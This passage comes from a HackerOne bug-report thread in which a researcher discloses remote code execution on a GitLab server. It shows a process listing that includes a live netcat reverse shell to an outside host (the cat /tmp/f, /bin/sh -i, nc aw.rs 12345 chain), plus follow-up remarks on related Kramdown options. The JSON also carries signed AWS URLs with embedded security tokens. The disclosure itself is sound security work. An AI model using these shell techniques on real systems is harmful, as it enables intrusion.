0.0  0.0      0     0 ?        I\u003c   Jan27   0:00 [writeback]\nroot       112  0.0  0.0      0     0 ?        S    Jan27   0:00 [kcompactd0]\nroot       113  0.0  0.0      0     0 ?        SN   Jan27   0:00 [ksmd]\nroot       114  0.0  0.0      0     0 ?        SN   Jan27   0:19 [khugepaged]\nroot       115  0.0  0.0      0     0 ?        I\u003c   Jan27   0:00 [crypto]\nroot       116  0.0  0.0      0     0 ?        I\u003c   Jan27   0:00 [kintegrityd]\nroot       117  0.0  0.0      0     0 ?        I\u003c   Jan27   0:00 [kblockd]\nroot       118  0.0  0.0      0     0 ?        I\u003c   Jan27   0:00 [ata_sff]\nroot       119  0.0  0.0      0     0 ?        I\u003c   Jan27   0:00 [md]\nroot       120  0.0  0.0      0     0 ?        I\u003c   Jan27   0:00 [edac-poller]\nroot       121  0.0  0.0      0     0 ?        I\u003c   Jan27   0:00 [devfreq_wq]\nroot       122  0.0  0.0      0     0 ?        I\u003c   Jan27   0:00 [watchdogd]\nroot       125  0.0  0.0      0     0 ?        S    Jan27   0:00 [kswapd0]\nroot       126  0.0  0.0      0     0 ?        I\u003c   Jan27   0:00 [kworker/u33:0]\nroot       127  0.0  0.0      0     0 ?        S    Jan27   0:00 [ecryptfs-kthrea]\nroot       170  0.0  0.0      0     0 ?        I\u003c   Jan27   0:00 [kthrotld]\nroot       171  0.0  0.0      0     0 ?        I\u003c   Jan27   0:00 [acpi_thermal_pm]\nroot       172  0.0  0.0      0     0 ?        S    Jan27   0:00 [scsi_eh_0]\nroot       173  0.0  0.0      0     0 ?        I\u003c   Jan27   0:00 [scsi_tmf_0]\nroot       181  0.0  0.0      0     0 ?        I\u003c   Jan27   0:00 [ipv6_addrconf]\nroot       192  0.0  0.0      0     0 ?        I\u003c   Jan27   0:00 [kstrp]\nroot       219  0.0  0.0      0     0 ?        I\u003c   Jan27   0:00 [charger_manager]\nroot       414  0.0  0.0      0     0 ?        I\u003c   Jan27   0:00 [raid5wq]\nroot       462  0.0  0.0      0     0 ?        S    Jan27   1:00 [jbd2/sda1-8]\nroot       463  0.0  0.0      0     0 ?        I\u003c   Jan27   0:00 [ext4-rsv-conver]\ngit        533 12.4  1.9 3034052 1261696 ?     Sl   02:33   5:00 puma: cluster worker 9: 4388 [gitlab-puma-worker]\nroot       545  0.0  0.0      0     0 ?        I\u003c   Jan27   1:11 [kworker/12:1H]\nroot       547  0.0  0.0  44648 12148 ?        Ss   Jan27  14:25 /lib/systemd/systemd-journald\nroot       550  0.0  0.0      0     0 ?        I\u003c   Jan27   0:00 [iscsi_eh]\nroot       551  0.0  0.0      0     0 ?        I\u003c   Jan27   0:00 [ib-comp-wq]\nroot       552  0.0  0.0      0     0 ?        I\u003c   Jan27   0:00 [ib-comp-unb-wq]\nroot       553  0.0  0.0      0     0 ?        I\u003c   Jan27   0:00 [ib_mcast]\nroot       554  0.0  0.0      0     0 ?        I\u003c   Jan27   0:00 [ib_nl_sa_wq]\nroot       555  0.0  0.0      0     0 ?        I\u003c   Jan27   0:00 [rdma_cm]\nroot       572  0.0  0.0 102968  1552 ?        Ss   Jan27   0:00 /sbin/lvmetad -f\nroot       592  0.0  0.0      0     0 ?        I\u003c   Jan27   0:01 [kworker/7:1H]\nroot       596  0.0  0.0  42628  3976 ?        Ss   Jan27   0:16 /lib/systemd/systemd-udevd\nroot       614  0.0  0.0   4392  1164 ?        Ss   Jan27   0:19 runsvdir -P /opt/gitlab/service log: ...........................................................................................................................................................................................................................................................................................................................................................................................................\nroot       676  0.0  0.0   4240  1196 ?        Ss   Jan27   0:00 runsv puma\nroot       686  0.0  0.0   4384  1204 ?        S    Jan27   0:00 svlogd -tt /var/log/gitlab/puma\nroot       694  0.0  0.0   4240  1132 ?        Ss   Jan27   0:00 runsv gitlab-workhorse\nroot       737  0.2  0.0   4384  1288 ?        S    Jan27 147:53 svlogd /var/log/gitlab/gitlab-workhorse\nroot       758  0.0  0.0   4240   648 ?        Ss   Jan27   0:00 runsv nginx\nroot       776  0.0  0.0      0     0 ?        S    Jan27   0:00 [hwrng]\nroot       791  0.0  0.0   4384  1292 ?        S    Jan27   0:00 svlogd -tt /var/log/gitlab/nginx\nroot       797  0.0  0.0   4240  1096 ?        Ss   Jan27   0:00 runsv logrotate\nroot       828  0.0  0.0   4384   708 ?        S    Jan27   0:00 svlogd -tt /var/log/gitlab/logrotate\nroot      1017  0.0  0.0      0     0 ?        I\u003c   Jan27   0:06 [kworker/13:1H]\nroot      1024  0.0  0.0      0     0 ?        I\u003c   Jan27   0:02 [kworker/0:1H]\ngit       1117 13.8  1.8 2974232 1248464 ?     Sl   02:34   5:26 puma: cluster worker 2: 4388 [gitlab-puma-worker]\nroot      1302  0.0  0.0  16120  2896 ?        Ss   Jan27   0:00 /sbin/dhclient -1 -v -pf /run/dhclient.ens4.pid -lf /var/lib/dhcp/dhclient.ens4.leases -I -df /var/lib/dhcp/dhclient6.ens4.leases ens4\nroot      1456  0.0  0.0      0     0 ?        I\u003c   Jan27   0:01 [kworker/9:1H]\nroot      1467  0.0  0.0      0     0 ?        I\u003c   Jan27   0:03 [kworker/14:1H]\nroot      1511  0.0  0.0   5220   152 ?        Ss   Jan27   0:51 /sbin/iscsid\nroot      1513  0.0  0.0   5720  3516 ?        S\u003cLs Jan27   4:05 /sbin/iscsid\nmessage+  1524  0.0  0.0  43036  3976 ?        Ss   Jan27   0:13 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation\nroot      1580  0.0  0.0   4396  1292 ?        Ss   Jan27   0:00 /usr/sbin/acpid\ndaemon    1607  0.0  0.0  26044  2264 ?        Ss   Jan27   0:00 /usr/sbin/atd -f\nroot      1614  0.0  0.0  28620  3056 ?        Ss   Jan27   0:06 /lib/systemd/systemd-logind\ngit       1655 13.0  1.8 2988308 1217772 ?     Sl   02:35   4:59 puma: cluster worker 15: 4388 [gitlab-puma-worker]\nroot      1663  0.0  0.0 308784  1508 ?        Ssl  Jan27   0:24 /usr/bin/lxcfs /var/lib/lxcfs/\nroot      1709  0.0  0.0 274224  7116 ?        Ssl  Jan27   0:34 /usr/lib/accountsservice/accounts-daemon\nroot      1714  0.0  0.0  26068  2628 ?        Ss   Jan27   0:26 /usr/sbin/cron -f\nroot      1786  0.0  0.0 171716 19388 ?        Ssl  Jan27   0:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal\nroot      1791  0.0  0.0 277180  5984 ?        Ssl  Jan27   0:03 /usr/lib/policykit-1/polkitd --no-debug\nroot      1793  0.0  0.0      0     0 ?        I\u003c   Jan27   0:02 [kworker/3:1H]\nroot      1803  0.0  0.0      0     0 ?        I\u003c   Jan27   0:01 [kworker/11:1H]\nroot      1808  0.0  0.0  13372   160 ?        Ss   Jan27   0:00 /sbin/mdadm --monitor --pid-file /run/mdadm/monitor.pid --daemonise --scan --syslog\nroot      1879  0.0  0.0  14656  1788 tty1     Ss+  Jan27   0:00 /sbin/agetty --noclear tty1 linux\nroot      1880  0.0  0.0  12840  1708 ttyS0    Ss+  Jan27   0:00 /sbin/agetty --keep-baud 115200 38400 9600 ttyS0 vt220\nntp       1894  0.0  0.0  40268  4900 ?        Ss   Jan27   2:27 /usr/sbin/ntpd -p /var/run/ntpd.pid -g -c /var/lib/ntp/ntp.conf.dhcp -u 112:116\nroot      2144  0.0  0.0  65792 21960 ?        Ss   Jan27   2:25 /usr/bin/python3 /usr/bin/google_network_daemon\nroot      2150  0.0  0.0  65508 21712 ?        Ss   Jan27   1:24 /usr/bin/python3 /usr/bin/google_clock_skew_daemon\nroot      2274  0.0  0.0      0     0 ?        I\u003c   Jan27   0:02 [kworker/15:1H]\ngit       2339 14.1  1.8 3333652 1248564 ?     Sl   02:36   5:16 puma: cluster worker 6: 4388 [gitlab-puma-worker]\nroot      2450  0.0  0.0      0     0 ?        S    Jan27   1:24 [jbd2/sdb-8]\nroot      2451  0.0  0.0      0     0 ?        I\u003c   Jan27   0:00 [ext4-rsv-conver]\nroot      2573  0.0  0.0      0     0 ?        I\u003c   Jan27   0:02 [kworker/4:1H]\nroot      2574  0.0  0.0      0     0 ?        I\u003c   Jan27   0:02 [kworker/1:1H]\nroot      2575  0.0  0.0      0     0 ?        I\u003c   Jan27   0:02 [kworker/2:1H]\ngit       2920 11.7  1.9 3120404 1266512 ?     Sl   02:37   4:15 puma: cluster worker 13: 4388 [gitlab-puma-worker]\nroot      2968  0.0  0.0      0     0 ?        I    Mar14   0:00 [kworker/8:1]\nroot      2984  0.1  0.0      0     0 ?        I    01:09   0:08 [kworker/u32:2]\nroot      3207  0.0  0.0      0     0 ?        I    02:38   0:00 [kworker/7:1]\nsyslog    3208  0.0  0.0 256392  3108 ?        Ssl  02:38   0:00 /usr/sbin/rsyslogd -n\nroot      3221  0.0  0.0      0     0 ?        I    02:38   0:00 [kworker/9:0]\nroot      3532  0.1  0.0      0     0 ?        I    01:58   0:04 [kworker/u32:5]\nroot      3553  0.0  0.0      0     0 ?        I    Mar14   0:00 [kworker/13:1]\nroot      3575  0.0  0.0      0     0 ?        I    Mar14   0:00 [kworker/0:2]\ngit       3597 12.7  1.9 2966296 1284300 ?     Sl   02:38   4:30 puma: cluster worker 1: 4388 [gitlab-puma-worker]\ngit       3852  6.9  0.1 1902584 127192 ?      Ssl  Mar12 214:31 /opt/gitlab/embedded/bin/gitlab-workhorse -listenNetwork unix -listenUmask 0 -listenAddr /var/opt/gitlab/gitlab-workhorse/sockets/socket -authBackend http://localhost:8080 -authSocket /var/opt/gitlab/gitlab-rails/sockets/gitlab.socket -documentRoot /opt/gitlab/embedded/service/gitlab-rails/public -pprofListenAddr  -apiLimit 5 -apiQueueDuration 60s -apiQueueLimit 200 -prometheusListenAddr 0.0.0.0:9229 -secretPath /opt/gitlab/embedded/service/gitlab-rails/.gitlab_workhorse_secret -logFormat json -config config.toml\nroot      4209  0.0  0.0      0     0 ?        I    01:58   0:00 [kworker/5:1]\nroot      4250  0.0  0.0      0     0 ?        I\u003c   Jan27   0:01 [kworker/5:1H]\nroot      4251  0.0  0.0      0     0 ?        I\u003c   Jan27   0:01 [kworker/6:1H]\nroot      4252  0.0  0.0      0     0 ?        I\u003c   Jan27   0:01 [kworker/8:1H]\nroot      4253  0.0  0.0      0     0 ?        I\u003c   Jan27   0:01 [kworker/10:1H]\ngit       4328 11.9  1.8 2662164 1217036 ?     Sl   02:40   4:05 puma: cluster worker 10: 4388 [gitlab-puma-worker]\ngit       4388 13.7  1.5 2173176 990144 ?      Ssl  Mar12 421:55 puma 5.1.1 (unix:///var/opt/gitlab/gitlab-rails/sockets/gitlab.socket,tcp://0.0.0.0:8080) [gitlab-puma-worker]\nroot      4433  0.0  0.0      0     0 ?        I    Mar14   0:00 [kworker/12:2]\ngit       4657 12.1  2.0 2971436 1326468 ?     Sl   02:40   4:03 puma: cluster worker 11: 4388 [gitlab-puma-worker]\nroot      5132  0.0  0.0  54640  7084 ?        Ss   Mar08   0:00 nginx: master process /opt/gitlab/embedded/sbin/nginx -p /var/opt/gitlab/nginx\ngitlab-+  5133  0.0  0.0  59372 12708 ?        S    Mar08   3:52 nginx: worker process\ngitlab-+  5134  0.0  0.0  59364 12744 ?        S    Mar08   3:53 nginx: worker process\ngitlab-+  5135  0.0  0.0  59460 12616 ?        S    Mar08   3:56 nginx: worker process\ngitlab-+  5136  0.0  0.0  59356 12528 ?        S    Mar08   3:56 nginx: worker process\ngitlab-+  5137  0.0  0.0  59452 12916 ?        S    Mar08   5:21 nginx: worker process\ngitlab-+  5138  0.0  0.0  59376 12500 ?        S    Mar08   4:05 nginx: worker process\ngitlab-+  5139  0.0  0.0  59376 12508 ?        S    Mar08   4:08 nginx: worker process\ngitlab-+  5140  0.0  0.0  59356 12532 ?        S    Mar08   4:16 nginx: worker process\ngitlab-+  5141  0.0  0.0  59608 13036 ?        S    Mar08   4:31 nginx: worker process\ngitlab-+  5142  0.0  0.0  59464 13140 ?        S    Mar08   4:52 nginx: worker process\ngitlab-+  5143  0.0  0.0  59448 12488 ?        S    Mar08   4:04 nginx: worker process\ngitlab-+  5144  0.0  0.0  59840 13304 ?        S    Mar08   6:28 nginx: worker process\ngitlab-+  5145  0.1  0.0  60000 13540 ?        S    Mar08  12:20 nginx: worker process\ngitlab-+  5146  0.5  0.0  60404 14200 ?        S    Mar08  58:17 nginx: worker process\ngitlab-+  5147  3.7  0.0  60508 14364 ?        S    Mar08 383:48 nginx: worker process\ngitlab-+  5148  1.5  0.0  60488 14396 ?        S    Mar08 152:35 nginx: worker process\ngitlab-+  5149  0.0  0.0  54836  3644 ?        S    Mar08   0:01 nginx: cache manager process\ngit       5237 13.9  2.0 3236184 1382204 ?     Sl   02:41   4:31 puma: cluster worker 8: 4388 [gitlab-puma-worker]\nconsul    5596  0.6  0.1 187780 105132 ?       Ssl  Jan27 448:43 /opt/consul/1.7.2/consul agent -config-file=/etc/consul/consul.json -config-dir=/etc/consul/conf.d\ngit       5754 13.6  1.8 3183656 1250996 ?     Sl   02:42   4:16 puma: cluster worker 4: 4388 [gitlab-puma-worker]\ngit       6311 14.3  1.8 2870036 1198324 ?     Sl   02:43   4:21 puma: cluster worker 7: 4388 [gitlab-puma-worker]\ngit       6835 13.2  1.8 2946584 1217544 ?     Sl   02:44   3:53 puma: cluster worker 3: 4388 [gitlab-puma-worker]\nroot      7159  0.0  0.0      0     0 ?        I    Mar14   0:00 [kworker/13:2]\nroot      7277  0.0  0.0      0     0 ?        I    Mar14   0:00 [kworker/12:0]\ngit       7412 13.8  1.8 2920472 1219500 ?     Sl   02:45   3:55 puma: cluster worker 12: 4388 [gitlab-puma-worker]\nroot      7846  0.0  0.0      0     0 ?        I    Mar14   0:00 [kworker/15:2]\ngit       8032 11.8  1.8 2952984 1211404 ?     Sl   02:46   3:14 puma: cluster worker 5: 4388 [gitlab-puma-worker]\nroot      8082  0.0  0.0      0     0 ?        I    Mar14   0:00 [kworker/4:0]\nroot      8149  0.0  0.0  12204  4804 ?        Ss   Jan27  59:20 /usr/sbin/haveged --Foreground --verbose=1 -w 1024\nroot      8862  0.0  0.0      0     0 ?        I    Mar14   0:00 [kworker/14:1]\nroot      9722  0.0  0.0      0     0 ?        I    01:23   0:00 [kworker/11:0]\nroot      9728  0.0  0.0      0     0 ?        I    01:23   0:00 [kworker/9:1]\nroot      9729  0.0  0.0      0     0 ?        I    01:23   0:00 [kworker/10:2]\nroot     13276  0.0  0.0      0     0 ?        I    Mar14   0:00 [kworker/15:0]\nroot     14483  0.0  0.0      0     0 ?        I    01:26   0:00 [kworker/6:2]\nroot     16066  0.0  0.0      0     0 ?        I    Mar14   0:00 [kworker/2:2]\nroot     17276  0.0  0.0      0     0 ?        I    Mar14   0:00 [kworker/3:0]\nroot     18553  0.0  0.0      0     0 ?        I    Mar14   0:00 [kworker/4:1]\nroot     18845  0.1  0.0      0     0 ?        I    02:19   0:04 [kworker/u32:3]\nroot     19737  0.0  0.0      0     0 ?        I\u003c   Feb02   0:00 [xfsalloc]\nroot     19739  0.0  0.0      0     0 ?        I\u003c   Feb02   0:00 [xfs_mru_cache]\nroot     20625  0.0  0.0      0     0 ?        I    03:03   0:00 [kworker/5:2]\nroot     21604  1.0  0.0 1814880 37204 ?       Ssl  Jan29 656:13 /usr/bin/process-exporter --config.path /etc/process-exporter/chef-configured.yaml --web.listen-address=:9256 -threads=false -gather-smaps=false\nroot     23605  0.0  0.0      0     0 ?        I    Mar14   0:00 [kworker/14:2]\nroot     23944  0.0  0.0 293416 59540 ?        Sl   Mar10   0:57 /opt/td-agent/bin/ruby /opt/td-agent/bin/fluentd --log /var/log/td-agent/td-agent.log --daemon /var/run/td-agent/td-agent.pid\nroot     23949 17.1  0.5 2751768 365428 ?      Sl   Mar10 1119:54 /opt/td-agent/bin/ruby -Eascii-8bit:ascii-8bit /opt/td-agent/bin/fluentd --log /var/log/td-agent/td-agent.log --daemon /var/run/td-agent/td-agent.pid --under-supervisor\nroot     24722  0.1  0.0      0     0 ?        I    03:05   0:00 [kworker/u32:4]\nroot     25266  0.0  0.0   4392  1136 ?        Ss   Jan27   0:59 runsvdir -P /etc/service log: /process HTTP/1.1\" 200 153 - -\u003e /process 10.219.1.9 - - [15/Mar/2021:03:13:46 UTC] \"GET /process HTTP/1.1\" 200 153 - -\u003e /process 10.219.1.10 - - [15/Mar/2021:03:13:59 UTC] \"GET /process HTTP/1.1\" 200 153 - -\u003e /process 10.219.1.9 - - [15/Mar/2021:03:14:01 UTC] \"GET /process HTTP/1.1\" 200 153 - -\u003e /process 10.219.1.10 - - [15/Mar/2021:03:14:14 UTC] \"GET /process HTTP/1.1\" 200 153 - -\u003e /process\nroot     25356  0.0  0.0   4240   696 ?        Ss   Jan27   0:00 runsv node_exporter\nroot     25378  0.0  0.0   4384   656 ?        S    Jan27   0:00 svlogd -tt /var/log/prometheus/node_exporter\nroot     25990  0.0  0.0      0     0 ?        I    Mar14   0:00 [kworker/1:2]\nroot     26003  0.0  0.0      0     0 ?        I    Mar14   0:00 [kworker/0:1]\nroot     26122  0.0  0.0      0     0 ?        I    03:08   0:00 [kworker/11:1]\nroot     26128  0.0  0.0      0     0 ?        I    03:08   0:00 [kworker/1:0]\nroot     26445  0.0  0.0   4504   784 ?        Ss   03:08   0:00 /bin/sh /opt/gitlab/embedded/bin/gitlab-logrotate-wrapper\nroot     26449  0.0  0.0   4376   648 ?        S    03:08   0:00 sleep 600\nroot     26906  0.0  0.0   4240  1100 ?        Ss   Jan27   0:31 runsv ntpd_metrics\nroot     26919  0.0  0.0   4384   652 ?        S    Jan27   0:00 svlogd -tt /var/log/prometheus/node_exporter_ntpd_metrics\nroot     26926  0.0  0.0   4240  1100 ?        Ss   Jan27   0:03 runsv apt_metrics\nroot     26948  0.0  0.0   4384   664 ?        S    Jan27   0:00 svlogd -tt /var/log/prometheus/node_exporter_apt_metrics\nroot     27112  0.0  0.0   4240   804 ?        Ss   Jan27   0:00 runsv mtail\nroot     27132  0.0  0.0   4384   680 ?        S    Jan27   0:00 svlogd -tt /var/log/mtail\ngitlab-+ 27233  0.0  0.0 686776 26796 ?        Sl   Feb17  16:48 /opt/ruby-2.7.0/bin/ruby /opt/gitlab-monitor/bin/gitlab-mon web -c /opt/gitlab-monitor/config/worker-config.yml\nroot     27342  0.0  0.0   4376   700 ?        S    03:10   0:00 sleep 600\nroot     27352  0.0  0.0      0     0 ?        I    00:11   0:00 [kworker/2:0]\nroot     27459  0.0  0.0      0     0 ?        I    00:11   0:00 [kworker/8:2]\nroot     27669  0.1  0.0      0     0 ?        I    03:11   0:00 [kworker/u32:1]\npostfix  28015  0.0  0.0  67476  4560 ?        S    01:47   0:00 pickup -l -t fifo -u\nroot     28031  0.0  0.0      0     0 ?        I    02:29   0:00 [kworker/6:1]\nroot     28043  0.0  0.0      0     0 ?        I    02:29   0:00 [kworker/10:1]\ngit      28705  0.0  0.0  30496  2732 ?        S    03:13   0:00 cat /tmp/f\ngit      28706  0.0  0.0  30604  3632 ?        S    03:13   0:00 /bin/sh -i\ngit      28707  0.0  0.0  39476  3924 ?        S    03:13   0:00 nc aw.rs 12345\ngit      28735  0.0  0.0  30496  2688 ?        S    03:13   0:00 cat /tmp/f\ngit      28736  0.0  0.0  30604  2712 ?        S    03:13   0:00 /bin/sh -i\ngit      28737  0.0  0.0  39476  4004 ?        S    03:13   0:00 nc aw.rs 12345\nroot     28752  0.0  0.0   4240   640 ?        Ss   Jan27   0:00 runsv gitlab-monitor\nroot     28762  0.0  0.0   4384   676 ?        S    Jan27   0:00 svlogd -tt /var/log/gitlab-monitor\nroot     28765  0.0  0.0   4376   668 ?        S    03:13   0:00 sleep 60\ngit      29031  0.0  0.0  56028  4744 ?        R    03:14   0:00 ps auxww\nroot     29086  0.0  0.0 159732 54544 ?        Ssl  Jan27   0:06 /opt/chef/embedded/bin/ruby --disable-gems /usr/bin/chef-client -c /etc/chef/client.rb -i 1800 -s 300\nroot     29231  0.0  0.0  65408  4552 ?        Ss   Jan27   0:07 /usr/lib/postfix/sbin/master\npostfix  29236  0.0  0.0  67524  4544 ?        S    Jan27   0:01 qmgr -l -t fifo -u\nroot     29428  0.0  0.0  65512  6264 ?        Ss   Jan27   0:00 /usr/sbin/sshd -D\nroot     29451  0.0  0.1 1571212 110120 ?      Ssl  Jan27  42:55 /opt/prometheus/ebpf_exporter/ebpf_exporter --web.listen-address=:9435 --config.file=/opt/prometheus/ebpf_exporter/config.yml\nprometh+ 29466  0.5  0.0 720896 29076 ?        Sl   Jan27 351:43 /opt/prometheus/node_exporter/node_exporter --web.listen-address=:9100 --collector.mountstats --collector.nfs --collector.ntp --collector.textfile.directory=/opt/prometheus/node_exporter/metrics --collector.filesystem.ignored-fs-types=^(autofs|binfmt_misc|bpf|cgroup2?|configfs|debugfs|devpts|devtmpfs|fusectl|hugetlbfs|iso9660|mqueue|nfs.*|nsfs|overlay|proc|procfs|pstore|rpc_pipefs|securityfs|selinuxfs|squashfs|sysfs|tracefs)$ --collector.netstat.fields=^(.*_(InErrors|InErrs)|Ip_Forwarding|Ip(6|Ext)_(InOctets|OutOctets)|Icmp6?_(InMsgs|OutMsgs)|TcpExt_(Listen.*|Syncookies.*|TCPSynRetrans)|Tcp_(ActiveOpens|InSegs|OutSegs|OutRsts|PassiveOpens|RetransSegs|CurrEstab)|Udp6?_(InDatagrams|OutDatagrams|NoPorts|RcvbufErrors|SndbufErrors))$\nroot     29559  2.2  0.0 1701252 40300 ?       Sl   Jan27 1506:29 /opt/prometheus/mtail/mtail -progs /opt/prometheus/mtail/progs -logs /var/log/apt/term.log,/var/log/syslog,/var/log/td-agent/td-agent.log,/var/log/gitlab/gitlab-rails/*.log,/var/log/gitlab/unicorn/unicorn_stderr.log,/var/log/gitlab/unicorn/unicorn_stdout.log -logtostderr\nroot     29893  0.0  0.0  47692  3780 ?        Ss   Jan27   0:03 /sbin/rpcbind -f -w\nroot     31876  0.0  0.0      0     0 ?        I    Mar14   0:00 [kworker/3:2]\ngit      32026 14.7  1.8 2988328 1246912 ?     Sl   02:31   6:15 puma: cluster worker 14: 4388 [gitlab-puma-worker]\nroot     32240  0.0  0.0      0     0 ?        I    Mar14   0:00 [kworker/7:2]\nroot     32286  0.0  0.0      0     0 ?        I    02:32   0:01 [kworker/u32:0]\ngit      32427 13.6  1.8 2927556 1221412 ?     Sl   02:32   5:39 puma: cluster worker 0: 4388 [gitlab-puma-worker]\n$ exit\nConnection closed, listening again.\n```\n\nCheers,\nWill","automated_response":false,"created_at":"2021-03-15T03:23:58.442Z","updated_at":"2021-03-15T03:23:58.442Z","actor":{"username":"vakzz","cleared":true,"url":"/vakzz","profile_picture_urls":{"medium":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/6zbovkumst7oljmo9v21pig3yh9j/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c?response-content-disposition=inline%3B%20filename%3D%2294971b5a75a669ea52903c09fc847f3434930258211181557be06162f5a8bac0.jpg%22%3B%20filename%2A%3DUTF-8%27%2794971b5a75a669ea52903c09fc847f3434930258211181557be06162f5a8bac0.jpg\u0026response-content-type=image%2Fjpeg\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQWRDWPEXO%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132618Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJHMEUCIQDdpfP9zaQzdootuAesQcyxQfGfhPxZKuX1i7ijKLAzlAIgL5my807PEusr0VkqeU29XvZtEmCSLbM%2F7eKmnAELK9MqgwQI7v%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDLFQh%2Fbvd7dUg1KFQyrXA%2Fp%2FVtjehJVp7DZYy5u7sRWqZAssugTjxjLMX9n3LuBamcp6G%2Bwyw1kdH5Fc0oMbmVnKCYku75m349ci99IeZGYssnHPQFOGi3KPZcYmBTpCSWJYXklFmUzTDVSnxhcahSThqLhsURXVfnsh6wXSKZz6MsS7fD7HYiuK725Q%2F6sDk7h3pCuB5fUOqyZvOi6e%2FdSM5nyuKqUFkte%2F6i0uholiPHuOhv3puwk%2FK6F%2FiNA6QbCLyZcsFIj5wNcphNxGCbAX8GNv59qxPkBv7zU5QMZhaSRKnyFLoxSNWLKFqeO4qdN%2FgRbEF2RLvY5V1AD1BbElezpO2DYcV6sIiHwCYBPAVtJWc0Oep1T8Sx%2FIWEFxpRS%2B4EQR6%2BcQhrIR2caxSjEaPr13FV3IBlGYyL4TqPiwhW8W9gb3y9c3v7PIUkqs8IYIlAbA%2BK0arNEJfKBmrpxI03L5MtPD0eO6pxGJ9DvZkCWVCaXiTO6oSen4PpDOLghYHo%2B4Vpqvo3%2FpROjCxToAEvdKcvazzutHXo%2FsJlsjoo%2Fmx%2B1Ek92%2BufvnULE1KShcl4rj7BNA4T9Jjuo0ja%2BLxer65UO9tkrad6HgKA9hXXtyDBrlAmhTDWFKsmcmq2ihTQ7PrDCl4pCLBjqlAVM272WWPnlOeGyGQ9vB3AQrwELsHDPU0KiSwP4QYEOtuC3iFTxC%2FXRs42S51Jb7aTjsW4m6tY2xevuwO4tmkEyWJnLxLHRvktGKLmigB4rFLjusFml2FTXw5xWvfY786%2F8KQpyklyKdvZKCIlTGk1BlxxAAC17iJ1VlZV%2BzWSY7WJd1%2Fhm%2BXXw9P5X6Ch%2Fx17cYnn0uAeICgpjy1lOaC5Wkd0STsQ%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=ddef48f431abeae9742636487401236aad1a7fd53802d5ea626345398e0002a9"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":10997397,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks @vakzz,\n\nImpressive work, this was escalated back to the team shortly after you provided the information (night time for me). We're investigating the logs for signs of prior exploitation and we were wondering if you're aware of other Kramdown options to achieve the same result?\n\nBest regards,\nDominic\nGitLab Security Team\n","automated_response":false,"created_at":"2021-03-15T13:50:36.670Z","updated_at":"2021-03-15T13:50:36.670Z","actor":{"username":"dcouture","cleared":false,"url":"/dcouture","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/TpSJ356VRAW7GpCzzZ25R8Kb/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":10998072,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @dcouture,\n\n\u003e we were wondering if you're aware of other Kramdown options to achieve the same result?\n\nThe other inline option is `template` but that is already forbidden by default in the latest version.\n\nThe `input` option can also be used, but this cannot be set inline and has to be passed in as an option to `kramdown::Document.new`.\n\nCheers,\nWill","automated_response":false,"created_at":"2021-03-15T14:47:50.743Z","updated_at":"2021-03-15T14:47:50.743Z","actor":{"username":"vakzz","cleared":true,"url":"/vakzz","profile_picture_urls":{"medium":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/6zbovkumst7oljmo9v21pig3yh9j/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c?response-content-disposition=inline%3B%20filename%3D%2294971b5a75a669ea52903c09fc847f3434930258211181557be06162f5a8bac0.jpg%22%3B%20filename%2A%3DUTF-8%27%2794971b5a75a669ea52903c09fc847f3434930258211181557be06162f5a8bac0.jpg\u0026response-content-type=image%2Fjpeg\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQWRDWPEXO%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132618Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJHMEUCIQDdpfP9zaQzdootuAesQcyxQfGfhPxZKuX1i7ijKLAzlAIgL5my807PEusr0VkqeU29XvZtEmCSLbM%2F7eKmnAELK9MqgwQI7v%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDLFQh%2Fbvd7dUg1KFQyrXA%2Fp%2FVtjehJVp7DZYy5u7sRWqZAssugTjxjLMX9n3LuBamcp6G%2Bwyw1kdH5Fc0oMbmVnKCYku75m349ci99IeZGYssnHPQFOGi3KPZcYmBTpCSWJYXklFmUzTDVSnxhcahSThqLhsURXVfnsh6wXSKZz6MsS7fD7HYiuK725Q%2F6sDk7h3pCuB5fUOqyZvOi6e%2FdSM5nyuKqUFkte%2F6i0uholiPHuOhv3puwk%2FK6F%2FiNA6QbCLyZcsFIj5wNcphNxGCbAX8GNv59qxPkBv7zU5QMZhaSRKnyFLoxSNWLKFqeO4qdN%2FgRbEF2RLvY5V1AD1BbElezpO2DYcV6sIiHwCYBPAVtJWc0Oep1T8Sx%2FIWEFxpRS%2B4EQR6%2BcQhrIR2caxSjEaPr13FV3IBlGYyL4TqPiwhW8W9gb3y9c3v7PIUkqs8IYIlAbA%2BK0arNEJfKBmrpxI03L5MtPD0eO6pxGJ9DvZkCWVCaXiTO6oSen4PpDOLghYHo%2B4Vpqvo3%2FpROjCxToAEvdKcvazzutHXo%2FsJlsjoo%2Fmx%2B1Ek92%2BufvnULE1KShcl4rj7BNA4T9Jjuo0ja%2BLxer65UO9tkrad6HgKA9hXXtyDBrlAmhTDWFKsmcmq2ihTQ7PrDC